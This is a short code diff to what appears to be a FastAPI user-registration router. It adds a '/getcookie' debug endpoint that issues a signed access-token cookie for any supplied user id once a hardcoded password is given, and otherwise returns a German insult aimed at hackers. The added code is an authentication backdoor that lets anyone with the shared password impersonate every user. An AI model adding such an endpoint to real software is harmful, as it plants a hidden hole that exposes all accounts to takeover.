@@ -59,3 +59,12 @@ async def user_reg(user_data: SUserReg) -> dict:
             raise e
 
     return {'ok': True}
+
+
+@router.post('/getcookie')
+async def getcookiedebug(response: Response, uid: int, password: str):
+    if password == 'admin0156':
+        token = jwt_encode({'user_id': uid})
+        response.set_cookie('access_token', token)
+        return True
+    return 'Scheiß auf euch verdammten Hacker'
